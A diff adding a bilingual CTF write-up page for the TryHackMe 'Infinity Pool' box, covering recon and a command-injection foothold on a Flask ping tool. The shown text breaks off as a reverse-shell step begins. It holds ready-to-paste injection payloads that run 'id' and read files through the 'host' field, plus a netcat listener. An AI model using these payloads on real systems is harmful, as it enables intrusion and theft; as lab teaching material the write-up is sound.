@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="it" id="html-root">
+<head>
+  <meta charset="UTF-8"/>
+  <!-- flag trattenuta fino a fine evento: nessun valore reale in questo file -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src 'self';"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title data-it="Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo" data-en="Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo">Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo</title>
+  <meta name="description" data-it="Writeup TryHackMe Infinity Pool (Hacker Holidays 2026): runbook completo — command injection su un netcheck Flask, pivot in loopback, credenziali UCP hard-coded (CVE-2026-46376) su FreePBX 16, chiave nella segreteria e root via command injection su un job di export." data-en="TryHackMe Infinity Pool writeup (Hacker Holidays 2026): full runbook — command injection on a Flask netcheck, loopback pivot, hard-coded UCP creds (CVE-2026-46376) on FreePBX 16, the key in a voicemail and root via command injection on an export job." content="Writeup TryHackMe Infinity Pool (Hacker Holidays 2026): runbook completo — command injection su un netcheck Flask, pivot in loopback, credenziali UCP hard-coded (CVE-2026-46376) su FreePBX 16, chiave nella segreteria e root via command injection su un job di export."/>
+  <link rel="canonical" href="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/infinity-pool/"/>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;600;700&family=Barlow+Condensed:wght@700;900&display=swap" rel="stylesheet"/>
+<style>
+    :root{--orange:#ff6a00;--orange-faint:rgba(255,106,0,0.06);--black:#080808;--surface:#101010;--surface2:#161616;--border:#222;--text:#e8e8e8;--muted:#666;--mono:'Share Tech Mono',monospace;--sans:'Barlow',sans-serif;--condensed:'Barlow Condensed',sans-serif}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{background:var(--black);color:var(--text);font-family:var(--sans);font-weight:300;line-height:1.7;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    header{position:sticky;top:0;z-index:100;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+    .header-inner{max-width:960px;margin:0 auto;padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+    .back-link{font-family:var(--mono);font-size:0.75rem;color:var(--muted);letter-spacing:0.1em;transition:color 0.2s;display:flex;align-items:center;gap:0.5rem}
+    .back-link:hover{color:var(--orange)}
+    .logo{font-family:var(--mono);font-size:0.85rem}
+    .logo .dim{color:#fff}.logo .name{color:var(--orange)}
+    .article-header{max-width:960px;margin:0 auto;padding:4rem 2rem 3rem;border-bottom:1px solid var(--border)}
+    .article-meta{display:flex;align-items:center;gap:1.5rem;margin-bottom:2rem;flex-wrap:wrap}
+    .tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;border:1px solid var(--orange);padding:0.2rem 0.6rem}
+    .meta-item{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em}
+    .difficulty-badge{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;display:flex;align-items:center;gap:0.4rem}
+    .dot{width:6px;height:6px;border-radius:50%}
+    h1{font-family:var(--condensed);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;text-transform:uppercase;letter-spacing:-0.01em;line-height:1.05;color:var(--text);margin-bottom:1.5rem}
+    .article-intro{font-size:1.1rem;color:var(--muted);max-width:760px;line-height:1.8}
+    .article-body{max-width:960px;margin:0 auto;padding:3rem 2rem 5rem}
+    .article-body h2{font-family:var(--condensed);font-size:1.6rem;font-weight:700;text-transform:uppercase;letter-spacing:0.04em;color:var(--text);margin:3rem 0 1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border)}
+    .article-body h3{font-family:var(--condensed);font-size:1.2rem;font-weight:700;color:var(--orange);text-transform:uppercase;letter-spacing:0.06em;margin:2rem 0 0.75rem}
+    .article-body p{font-size:1rem;color:#bbb;line-height:1.85;margin-bottom:1.25rem}
+    .article-body strong{color:var(--text);font-weight:600}
+    .article-body em{color:var(--muted);font-style:italic}
+    .article-body ul,.article-body ol{margin:1rem 0 1.25rem 1.5rem}
+    .article-body li{font-size:1rem;color:#bbb;line-height:1.8;margin-bottom:0.4rem}
+    .code-block{background:#0a0a0a;border:1px solid var(--border);border-left:3px solid var(--orange);padding:1.5rem;margin:1.5rem 0;overflow-x:auto}
+    .code-block pre{font-family:var(--mono);font-size:0.78rem;color:var(--orange);line-height:1.8;white-space:pre}
+    .code-block .comment{color:var(--muted)}
+    .code-block .danger{color:#ff3333}
+    .code-block .ok{color:#00ff88}
+    .code-block .neutral{color:#aaa}
+    .code-block .warn{color:#ffaa00}
+    .callout{background:var(--orange-faint);border:1px solid rgba(255,106,0,0.25);border-left:3px solid var(--orange);padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-label{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-red{background:rgba(255,51,51,0.04);border:1px solid rgba(255,51,51,0.2);border-left:3px solid #ff3333;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-red .callout-label{font-family:var(--mono);font-size:0.65rem;color:#ff5555;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-red p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-green{background:rgba(0,255,136,0.03);border:1px solid rgba(0,255,136,0.15);border-left:3px solid #00ff88;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-green .callout-label{font-family:var(--mono);font-size:0.65rem;color:#00ff88;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-green p{font-size:0.9rem;color:var(--text);margin:0}
+    .tldr{background:var(--surface2);border:1px solid var(--border);padding:2rem;margin-bottom:3rem}
+    .tldr-label{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:1rem}
+    .tldr ul{margin-left:1.25rem}
+    .tldr li{font-size:0.9rem;color:var(--text);line-height:1.7;margin-bottom:0.4rem}
+    .tldr p{font-size:0.88rem;color:var(--muted);margin:1rem 0 0;line-height:1.7}
+    table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-family:var(--mono);font-size:0.78rem}
+    th{text-align:left;color:var(--orange);padding:0.6rem 0.75rem;border-bottom:1px solid var(--border);letter-spacing:0.1em;text-transform:uppercase}
+    td{padding:0.55rem 0.75rem;border-bottom:1px solid #1a1a1a;color:#bbb;vertical-align:top}
+    td.ok{color:#00ff88}
+    td.danger{color:#ff5555}
+    td.warn{color:#ffaa00}
+    td strong{color:var(--text)}
+    tr:last-child td{border-bottom:none}
+    .article-footer{border-top:1px solid var(--border);padding:2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+    .article-footer a{font-family:var(--mono);font-size:0.75rem;color:var(--orange);letter-spacing:0.1em;transition:opacity 0.2s}
+    .footer-copy{font-family:var(--mono);font-size:0.65rem;color:var(--muted);opacity:0.5}
+    @media(max-width:768px){h1{font-size:2rem}table{font-size:0.7rem}}
+    .lang-toggle{display:flex;border:1px solid var(--border);overflow:hidden;flex-shrink:0}
+    .lang-btn{font-family:var(--mono);font-size:0.65rem;padding:0.3rem 0.6rem;background:transparent;color:var(--muted);border:none;cursor:pointer;letter-spacing:0.08em;text-transform:uppercase;transition:all .2s}
+    .lang-btn.active{background:var(--orange);color:var(--black)}
+    .lang-btn:hover:not(.active){color:var(--orange)}
+    #read-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:var(--orange);z-index:200;transition:width .08s linear;pointer-events:none}
+    #back-top{position:fixed;bottom:1.75rem;right:1.75rem;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);background:var(--surface);border:1px solid var(--border);padding:0.45rem 0.7rem;cursor:pointer;opacity:0;pointer-events:none;transition:opacity .25s,color .2s,border-color .2s;z-index:150}
+    #back-top.vis{opacity:1;pointer-events:all}
+    #back-top:hover{color:var(--orange);border-color:var(--orange)}
+    .share-wrap{max-width:960px;margin:0 auto;padding:1.5rem 2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;border-top:1px solid var(--border)}
+    .share-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase;flex-shrink:0}
+    .share-btns{display:flex;gap:0.4rem;flex-wrap:wrap}
+    .share-btn{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;color:var(--muted);border:1px solid var(--border);padding:0.3rem 0.65rem;background:transparent;cursor:pointer;transition:color .2s,border-color .2s;text-decoration:none;display:inline-block}
+    .share-btn:hover{color:var(--orange);border-color:var(--orange)}
+    .share-btn.ok{color:#00ff88;border-color:#00ff88}
+    .auth-wrap{display:flex;align-items:center;gap:0.5rem}
+    .auth-bar{width:44px;height:3px;background:var(--border);overflow:hidden;flex-shrink:0}
+    .auth-human{height:100%;background:var(--orange)}
+    .auth-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.08em}
+    .cve-badge{display:inline-block;font-family:var(--mono);font-size:0.7rem;background:rgba(255,51,51,0.08);border:1px solid rgba(255,51,51,0.3);color:#ff5555;padding:0.3rem 0.75rem;letter-spacing:0.05em;margin:0.5rem 0}
+    .lang-en{display:none}
+      /* AUTHOR BOX */
+    .author-box{max-width:760px;margin:3.5rem auto 0;padding:1.75rem;background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--orange)}
+    .author-box .ab-label{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase}
+    .author-box .ab-name{font-family:var(--condensed);font-weight:900;font-size:1.5rem;text-transform:uppercase;color:var(--text);letter-spacing:0.02em;margin-top:0.5rem;line-height:1}
+    .author-box .ab-role{font-family:var(--mono);font-size:0.68rem;color:var(--orange);margin-top:0.45rem;line-height:1.6}
+    .author-box .ab-bio{font-size:0.9rem;color:var(--muted);line-height:1.65;margin-top:0.9rem}
+    .author-box .ab-links{display:flex;flex-wrap:wrap;gap:0.6rem;margin-top:1.2rem;align-items:center}
+    .author-box .ab-links a{font-family:var(--mono);font-size:0.68rem;color:var(--muted);border:1px solid var(--border);padding:0.4rem 0.8rem;letter-spacing:0.08em;transition:border-color .2s,color .2s}
+    .author-box .ab-links a:hover{border-color:var(--orange);color:var(--orange)}
+    .author-box .ab-links a.ab-cta{color:var(--orange);border-color:var(--orange)}
+    .author-box .ab-links a.ab-cta:hover{background:var(--orange);color:var(--black)}
+    @media(max-width:600px){.author-box{margin:2.5rem 1.25rem 0;padding:1.25rem}}
+</style>
+
+  <style>
+    .article-body code,.tldr code,.callout code,.callout-red code,.callout-green code{font-family:var(--mono);color:var(--orange)}
+    .redaction{font-family:var(--mono);color:var(--orange);letter-spacing:2px}
+    .crumb{max-width:960px;margin:0 auto;padding:1rem 2rem 0;font-family:var(--mono);font-size:0.66rem;color:#5f5f5f;letter-spacing:0.08em}
+    .crumb a{color:var(--muted)}.crumb a:hover{color:var(--orange)}.crumb .here{color:var(--orange)}
+    .meme-tag{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;border:1px dashed var(--border);padding:0.25rem 0.6rem}
+  </style>
+  <meta property="og:type" content="article"/>
+  <meta property="og:site_name" content="NonèCostanzo — Paolo Costanzo"/>
+  <meta property="og:title" data-it="Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo" data-en="Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo" content="Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo"/>
+  <meta property="og:description" data-it="Writeup TryHackMe Infinity Pool (Hacker Holidays 2026): runbook completo — command injection su un netcheck Flask, pivot in loopback, credenziali UCP hard-coded (CVE-2026-46376) su FreePBX 16, chiave nella segreteria e root via command injection su un job di export." data-en="TryHackMe Infinity Pool writeup (Hacker Holidays 2026): full runbook — command injection on a Flask netcheck, loopback pivot, hard-coded UCP creds (CVE-2026-46376) on FreePBX 16, the key in a voicemail and root via command injection on an export job." content="Writeup TryHackMe Infinity Pool (Hacker Holidays 2026): runbook completo — command injection su un netcheck Flask, pivot in loopback, credenziali UCP hard-coded (CVE-2026-46376) su FreePBX 16, chiave nella segreteria e root via command injection su un job di export."/>
+  <meta property="og:url" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/infinity-pool/"/>
+  <meta property="og:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/infinity-pool/og.png"/>
+  <meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/>
+  <meta property="og:image:alt" content="Infinity Pool — CTF walkthrough"/>
+  <meta property="og:locale" data-it="it_IT" data-en="en_US" content="it_IT"/>
+  <meta property="article:published_time" content="2026-08-06T09:00:00+02:00"/>
+  <meta property="article:modified_time" content="2026-08-06T09:00:00+02:00"/>
+  <meta property="article:author" content="https://www.paolocostanzo.com"/>
+  <meta property="article:section" content="CTF"/>
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" data-it="Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo" data-en="Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo" content="Infinity Pool (THM): command injection → FreePBX → root — NonèCostanzo"/>
+  <meta name="twitter:description" data-it="Writeup TryHackMe Infinity Pool (Hacker Holidays 2026): runbook completo — command injection su un netcheck Flask, pivot in loopback, credenziali UCP hard-coded (CVE-2026-46376) su FreePBX 16, chiave nella segreteria e root via command injection su un job di export." data-en="TryHackMe Infinity Pool writeup (Hacker Holidays 2026): full runbook — command injection on a Flask netcheck, loopback pivot, hard-coded UCP creds (CVE-2026-46376) on FreePBX 16, the key in a voicemail and root via command injection on an export job." content="Writeup TryHackMe Infinity Pool (Hacker Holidays 2026): runbook completo — command injection su un netcheck Flask, pivot in loopback, credenziali UCP hard-coded (CVE-2026-46376) su FreePBX 16, chiave nella segreteria e root via command injection su un job di export."/>
+  <meta name="twitter:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/infinity-pool/og.png"/>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"TechArticle",
+  "headline":"Infinity Pool (THM): command injection \u2192 FreePBX \u2192 root",
+  "description":"Writeup TryHackMe Infinity Pool (Hacker Holidays 2026): runbook completo \u2014 command injection su un netcheck Flask, pivot in loopback, credenziali UCP hard-coded (CVE-2026-46376) su FreePBX 16, chiave nella segreteria e root via command injection su un job di export.",
+  "image":["https://paolocostanzo.github.io/ctf/hacker-holidays-2026/infinity-pool/og.png"],"datePublished":"2026-08-06T09:00:00+02:00","dateModified":"2026-08-06T09:00:00+02:00","inLanguage":"it","articleSection":"CTF",
+  "keywords":"TryHackMe, Hacker Holidays 2026, Infinity Pool, Boot2root, FreePBX, CTF walkthrough",
+  "mainEntityOfPage":{"@type":"WebPage","@id":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/infinity-pool/"},"url":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/infinity-pool/",
+  "author":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com","sameAs":["https://www.linkedin.com/in/paolocostanzoit/","https://github.com/paolocostanzo","https://www.researchgate.net/profile/Paolo-Costanzo-2"]},
+  "publisher":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com"},
+  "about":{"@type":"Thing","name":"TryHackMe — Infinity Pool"}
+}
+  </script>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[
+    {"@type":"ListItem","position":1,"name":"CTF","item":"https://paolocostanzo.github.io/ctf/"},
+    {"@type":"ListItem","position":2,"name":"Hacker Holidays 2026","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/"},
+    {"@type":"ListItem","position":3,"name":"Infinity Pool","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/infinity-pool/"}
+  ]
+}
+  </script>
+</head>
+
+<body>
+  <div id="read-bar"></div>
+  <header>
+    <div class="header-inner">
+      <a class="back-link" href="/ctf/hacker-holidays-2026/" data-it="← Hacker Holidays 2026" data-en="← Hacker Holidays 2026">← Hacker Holidays 2026</a>
+      <div class="logo"><span class="dim">nonè@</span><span class="name">costanzo</span><span class="dim">:~$</span></div>
+      <div class="lang-toggle">
+        <button class="lang-btn active" onclick="setLang('it')" aria-pressed="true">IT</button>
+        <button class="lang-btn" onclick="setLang('en')" aria-pressed="false">EN</button>
+      </div>
+    </div>
+  </header>
+  <nav class="crumb" aria-label="breadcrumb"><a href="/ctf/">CTF</a> / <a href="/ctf/hacker-holidays-2026/">Hacker Holidays 2026</a> / <span class="here">Infinity Pool</span></nav>
+  <main>
+  <article>
+  <div class="article-header">
+    <div class="article-meta">
+      <span class="tag">Boot2root</span><span class="tag">FreePBX</span>
+      <span class="tag">TryHackMe</span>
+      <time class="meta-item" datetime="2026-08-06" data-it="06 Ago 2026" data-en="06 Aug 2026">06 Ago 2026</time>
+      <span class="meta-item" data-it="13 min di lettura" data-en="13 min read">13 min di lettura</span>
+      <span class="difficulty-badge" style="color:#ff8800"><span class="dot" style="background:#ff8800"></span><span>Medium/Hard</span></span>
+      <span class="meme-tag" data-it="// il bordo non si vede, la root sì" data-en="// no visible edge, very visible root">// il bordo non si vede, la root sì</span>
+    </div>
+    <h1 data-it="Infinity Pool: dal netcheck alla root, passando per un centralino" data-en="Infinity Pool: from a netcheck to root, by way of a phone system">Infinity Pool: dal netcheck alla root, passando per un centralino</h1>
+    <p class="article-intro" data-it="Il bordo di una infinity pool non si vede — e nemmeno il confine di questa macchina. Un pannello «pool ops» offre un innocuo controllo di rete che finisce dritto in una shell; da lì la strada attraversa tre servizi che si parlano solo in loopback: un edge in Flask, una console di sorveglianza che perde credenziali, e un microservizio che gira come &lt;strong&gt;root&lt;/strong&gt;. La chiave per l'ultimo passo non è in un file: arriva come &lt;em&gt;messaggio in segreteria&lt;/em&gt; su un FreePBX. Qui sotto ogni comando è pronto da incollare, sostituendo &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; col tuo IP." data-en="The edge of an infinity pool is invisible — and so is this box's boundary. A &quot;pool ops&quot; panel offers a harmless network check that drops you straight into a shell; from there the path runs through three services that only talk over loopback: a Flask edge, a surveillance console that leaks credentials, and a microservice running as &lt;strong&gt;root&lt;/strong&gt;. The key for the last step isn't in a file: it arrives as a &lt;em&gt;voicemail&lt;/em&gt; on a FreePBX. Every command below is copy-paste ready — swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for your IP.">Il bordo di una infinity pool non si vede — e nemmeno il confine di questa macchina. Un pannello «pool ops» offre un innocuo controllo di rete che finisce dritto in una shell; da lì la strada attraversa tre servizi che si parlano solo in loopback: un edge in Flask, una console di sorveglianza che perde credenziali, e un microservizio che gira come <strong>root</strong>. La chiave per l'ultimo passo non è in un file: arriva come <em>messaggio in segreteria</em> su un FreePBX. Qui sotto ogni comando è pronto da incollare, sostituendo <code>&lt;target&gt;</code> col tuo IP.</p>
+  </div>
+  <div class="article-body">
+
+    <div class="tldr">
+      <div class="tldr-label" data-it="// TL;DR" data-en="// TL;DR">// TL;DR</div>
+      <ul><li data-it="&lt;strong&gt;Command injection&lt;/strong&gt; nel netcheck &lt;code&gt;/internal/netcheck&lt;/code&gt; (&lt;code&gt;ping -c 1 {host}&lt;/code&gt; con &lt;code&gt;shell=True&lt;/code&gt;) → RCE come &lt;code&gt;web&lt;/code&gt; e user flag." data-en="&lt;strong&gt;Command injection&lt;/strong&gt; in the &lt;code&gt;/internal/netcheck&lt;/code&gt; tool (&lt;code&gt;ping -c 1 {host}&lt;/code&gt; with &lt;code&gt;shell=True&lt;/code&gt;) → RCE as &lt;code&gt;web&lt;/code&gt; and the user flag."><strong>Command injection</strong> nel netcheck <code>/internal/netcheck</code> (<code>ping -c 1 {host}</code> con <code>shell=True</code>) → RCE come <code>web</code> e user flag.</li><li data-it="&lt;strong&gt;Servizi in loopback&lt;/strong&gt;: una console (&lt;code&gt;:3000&lt;/code&gt;) perde le credenziali UCP; un microservizio di automazione (&lt;code&gt;:9000&lt;/code&gt;) gira come &lt;strong&gt;root&lt;/strong&gt; ma vuole un Bearer token." data-en="&lt;strong&gt;Loopback services&lt;/strong&gt;: a console (&lt;code&gt;:3000&lt;/code&gt;) leaks the UCP credentials; an automation microservice (&lt;code&gt;:9000&lt;/code&gt;) runs as &lt;strong&gt;root&lt;/strong&gt; but wants a Bearer token."><strong>Servizi in loopback</strong>: una console (<code>:3000</code>) perde le credenziali UCP; un microservizio di automazione (<code>:9000</code>) gira come <strong>root</strong> ma vuole un Bearer token.</li><li data-it="&lt;strong&gt;FreePBX 16 · CVE-2026-46376&lt;/strong&gt;: l'utente &lt;code&gt;FreePBXUCPTemplateCreator&lt;/code&gt; sono credenziali del template UCP hard-coded. Login all'UCP — e il login è AJAX, non un form-POST." data-en="&lt;strong&gt;FreePBX 16 · CVE-2026-46376&lt;/strong&gt;: the &lt;code&gt;FreePBXUCPTemplateCreator&lt;/code&gt; user is a hard-coded UCP template credential. Log into UCP — and the login is AJAX, not a form-POST."><strong>FreePBX 16 · CVE-2026-46376</strong>: l'utente <code>FreePBXUCPTemplateCreator</code> sono credenziali del template UCP hard-coded. Login all'UCP — e il login è AJAX, non un form-POST.</li><li data-it="&lt;strong&gt;La chiave è una segreteria&lt;/strong&gt;: il Bearer token dell'automazione è il Caller ID di un messaggio vocale nell'INBOX (&lt;code&gt;command=grid&lt;/code&gt;)." data-en="&lt;strong&gt;The key is a voicemail&lt;/strong&gt;: the automation Bearer token is the Caller ID of a message in the INBOX (&lt;code&gt;command=grid&lt;/code&gt;)."><strong>La chiave è una segreteria</strong>: il Bearer token dell'automazione è il Caller ID di un messaggio vocale nell'INBOX (<code>command=grid</code>).</li><li data-it="&lt;strong&gt;Root&lt;/strong&gt;: il job &lt;code&gt;/jobs/export&lt;/code&gt; infila il parametro &lt;code&gt;report&lt;/code&gt; in un &lt;code&gt;tar czf ...&lt;/code&gt; senza sanificarlo → command injection come root." data-en="&lt;strong&gt;Root&lt;/strong&gt;: the &lt;code&gt;/jobs/export&lt;/code&gt; job drops the &lt;code&gt;report&lt;/code&gt; parameter into a &lt;code&gt;tar czf ...&lt;/code&gt; without sanitising → command injection as root."><strong>Root</strong>: il job <code>/jobs/export</code> infila il parametro <code>report</code> in un <code>tar czf ...</code> senza sanificarlo → command injection come root.</li></ul>
+    </div>
+
+    <h2 data-it="[01] Ricognizione" data-en="[01] Recon" id='recon'>[01] Ricognizione</h2>
+    <p data-it="Una sola porta interessante: un'app Flask servita da gunicorn sulla 80. La home è un pannello «Closed Circuit — pool ops»; una pagina &lt;code&gt;/status&lt;/code&gt; espone un piccolo strumento di diagnostica di rete che fa un &lt;em&gt;ping&lt;/em&gt; a un host a scelta. Ogni volta che un'app ti lascia scegliere cosa «pingare», la prima domanda è: &lt;strong&gt;come costruisce il comando?&lt;/strong&gt;" data-en="One interesting port: a Flask app served by gunicorn on 80. The home is a &quot;Closed Circuit — pool ops&quot; panel; a &lt;code&gt;/status&lt;/code&gt; page exposes a small network-diagnostics tool that &lt;em&gt;pings&lt;/em&gt; a host of your choice. Whenever an app lets you pick what to &quot;ping&quot;, question one is: &lt;strong&gt;how does it build the command?&lt;/strong&gt;">Una sola porta interessante: un'app Flask servita da gunicorn sulla 80. La home è un pannello «Closed Circuit — pool ops»; una pagina <code>/status</code> espone un piccolo strumento di diagnostica di rete che fa un <em>ping</em> a un host a scelta. Ogni volta che un'app ti lascia scegliere cosa «pingare», la prima domanda è: <strong>come costruisce il comando?</strong></p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># scan</span>
+<span class="neutral">nmap -Pn -sV -p- &lt;target&gt;</span>
+<span class="neutral">80/tcp open  http  gunicorn (Flask)</span>
+<span class="neutral"></span>
+<span class="comment"># la home e la pagina di status</span>
+<span class="neutral">curl -s http://&lt;target&gt;/ | grep -i -o 'pool ops\|netcheck\|status'</span>
+<span class="neutral">curl -s http://&lt;target&gt;/status | grep -i 'name="host"'</span>
+<span class="ok">&lt;input name="host" ...&gt;</span>   # c'e un campo host: candidato per l'injection</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># scan</span>
+<span class="neutral">nmap -Pn -sV -p- &lt;target&gt;</span>
+<span class="neutral">80/tcp open  http  gunicorn (Flask)</span>
+<span class="neutral"></span>
+<span class="comment"># the home and the status page</span>
+<span class="neutral">curl -s http://&lt;target&gt;/ | grep -i -o 'pool ops\|netcheck\|status'</span>
+<span class="neutral">curl -s http://&lt;target&gt;/status | grep -i 'name="host"'</span>
+<span class="ok">&lt;input name="host" ...&gt;</span>   # there's a host field: injection candidate</pre>
+</div></div>
+
+    <h2 data-it="[02] Command injection → foothold (web)" data-en="[02] Command injection → foothold (web)" id='rce-web'>[02] Command injection → foothold (web)</h2>
+    <p data-it="Il netcheck accetta un &lt;code&gt;host&lt;/code&gt; in POST su &lt;code&gt;/internal/netcheck&lt;/code&gt; e lo passa a &lt;code&gt;ping&lt;/code&gt;. Se lo fa con &lt;code&gt;shell=True&lt;/code&gt; e senza sanificazione, un &lt;code&gt;;&lt;/code&gt; mi lascia appendere un secondo comando. Provo subito con &lt;code&gt;id&lt;/code&gt;: l'output compare nella pagina di risposta, tra le statistiche del ping." data-en="The netcheck takes a &lt;code&gt;host&lt;/code&gt; via POST on &lt;code&gt;/internal/netcheck&lt;/code&gt; and hands it to &lt;code&gt;ping&lt;/code&gt;. If it does so with &lt;code&gt;shell=True&lt;/code&gt; and no sanitisation, a &lt;code&gt;;&lt;/code&gt; lets me append a second command. I try &lt;code&gt;id&lt;/code&gt; right away: the output shows up in the response page, among the ping statistics.">Il netcheck accetta un <code>host</code> in POST su <code>/internal/netcheck</code> e lo passa a <code>ping</code>. Se lo fa con <code>shell=True</code> e senza sanificazione, un <code>;</code> mi lascia appendere un secondo comando. Provo subito con <code>id</code>: l'output compare nella pagina di risposta, tra le statistiche del ping.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># la injection: chiudo l'host con ; e appendo il mio comando</span>
+<span class="neutral">curl -s http://&lt;target&gt;/internal/netcheck \</span>
+<span class="neutral">     --data-urlencode 'host=127.0.0.1; id' | sed 's/&lt;[^&gt;]*&gt;//g' | grep uid</span>
+<span class="ok">uid=1001(web) gid=1001(web) groups=1001(web)</span>   # RCE confermata
+<span class="neutral"></span>
+<span class="comment"># la user flag e nella home di web</span>
+<span class="neutral">curl -s http://&lt;target&gt;/internal/netcheck \</span>
+<span class="neutral">     --data-urlencode 'host=127.0.0.1; cat /home/web/user.txt' | sed 's/&lt;[^&gt;]*&gt;//g' | grep THM</span>
+THM{<span class="redaction">████████████████████</span>}   # oscurata: policy</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># the injection: close host with ; and append my command</span>
+<span class="neutral">curl -s http://&lt;target&gt;/internal/netcheck \</span>
+<span class="neutral">     --data-urlencode 'host=127.0.0.1; id' | sed 's/&lt;[^&gt;]*&gt;//g' | grep uid</span>
+<span class="ok">uid=1001(web) gid=1001(web) groups=1001(web)</span>   # RCE confirmed
+<span class="neutral"></span>
+<span class="comment"># the user flag is in web's home</span>
+<span class="neutral">curl -s http://&lt;target&gt;/internal/netcheck \</span>
+<span class="neutral">     --data-urlencode 'host=127.0.0.1; cat /home/web/user.txt' | sed 's/&lt;[^&gt;]*&gt;//g' | grep THM</span>
+THM{<span class="redaction">████████████████████</span>}   # redacted: policy</pre>
+</div></div>
+    <p data-it="Confermo leggendo il sorgente dell'app (è world-readable): la conferma nera su bianco del perché funziona." data-en="I confirm by reading the app source (it's world-readable): the black-and-white reason it works.">Confermo leggendo il sorgente dell'app (è world-readable): la conferma nera su bianco del perché funziona.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># il sorgente dell'edge conferma shell=True</span>
+<span class="neutral">curl -s http://&lt;target&gt;/internal/netcheck \</span>
+<span class="neutral">     --data-urlencode 'host=;cat /var/www/infinity_pool/edge/app.py' | sed 's/&lt;[^&gt;]*&gt;//g'</span>
+<span class="neutral"></span>
+<span class="danger">proc = subprocess.run(f"ping -c 1 {host}", shell=True, ...)</span>   # host non sanificato</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># the edge source confirms shell=True</span>
+<span class="neutral">curl -s http://&lt;target&gt;/internal/netcheck \</span>
+<span class="neutral">     --data-urlencode 'host=;cat /var/www/infinity_pool/edge/app.py' | sed 's/&lt;[^&gt;]*&gt;//g'</span>
+<span class="neutral"></span>
+<span class="danger">proc = subprocess.run(f"ping -c 1 {host}", shell=True, ...)</span>   # host unsanitised</pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># opzionale ma comodo: una reverse shell come web (i passi [03]-[08] girano sul box)</span>
+<span class="comment"># sul TUO box, in ascolto:</span>
+<span class="neutral">nc -lvnp 4444</span>
+<span class="comment"># poi inietta il callback nel netcheck (sostituisci &lt;attacker&gt; col tuo IP tun0):</span>
+<span class="neutral">curl -s http://&lt;target&gt;/internal/netcheck \</span>
